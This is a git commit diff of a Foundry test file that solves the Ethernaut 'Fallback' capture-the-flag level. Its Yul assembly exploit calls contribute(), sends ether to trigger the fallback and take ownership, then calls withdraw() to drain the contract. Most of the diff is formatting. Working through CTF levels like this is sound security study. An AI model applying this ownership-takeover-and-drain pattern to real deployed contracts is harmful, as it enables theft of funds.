14e8ac2331e07b22b7809406d70623e97ea14bd1
Keshav Mundhra <55694394+mundhrakeshav@users.noreply.github.com>
2023-02-14 15:43:53 +0530

    Revert "Learn huff"

--- test/CTFs/ethernaut/Fallback.t.sol
+++ test/CTFs/ethernaut/Fallback.t.sol
@@ -1,4 +1,6 @@
-// SPDX-License-Identifier: MIT
+
+
+// SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.17;
 
 import "forge-std/Test.sol";
@@ -8,7 +10,6 @@ import {BaseTest} from "./BaseTest.t.sol";
 contract FallbackTest is BaseTest {
     Fallback public fallbackInstance = Fallback(payable(0x19F9FC2C0753646e3058978D0D20E5F63D72945A));
     bytes32 CONTRIBUTE_FUNCTION_SIG = keccak256("withdraw()");
-
     function setUp() public override {
         super.setUp();
     }
@@ -32,16 +33,22 @@ contract FallbackTest is BaseTest {
     function exploitYul() internal override {
         address _to = address(fallbackInstance); // TODO: read it using sload and then use
         assembly {
-            // Function Sig for contribute()
+                        // Function Sig for contribute()
             mstore(0x00, 0xd7bb99ba00000000000000000000000000000000000000000000000000000000)
             let success := call(gas(), _to, 1000000000000, 0x00, 0x04, 0x00, 0x00)
-            if iszero(success) { revert(0, 0) }
+            if iszero(success) {
+                revert(0, 0)
+            }
             success := call(gas(), _to, 1000000000000000000, 0x00, 0x00, 0x00, 0x00)
-            if iszero(success) { revert(0, 0) }
-            // Function Sig for withdraw()
+            if iszero(success) {
+                revert(0, 0)
+            }
+                        // Function Sig for withdraw()
             mstore(0x00, 0x3ccfd60b00000000000000000000000000000000000000000000000000000000)
             success := call(gas(), _to, 0, 0x00, 0x04, 0x00, 0x00)
-            if iszero(success) { revert(0, 0) }
+            if iszero(success) {
+                revert(0, 0)
+            }
         }
     }
 
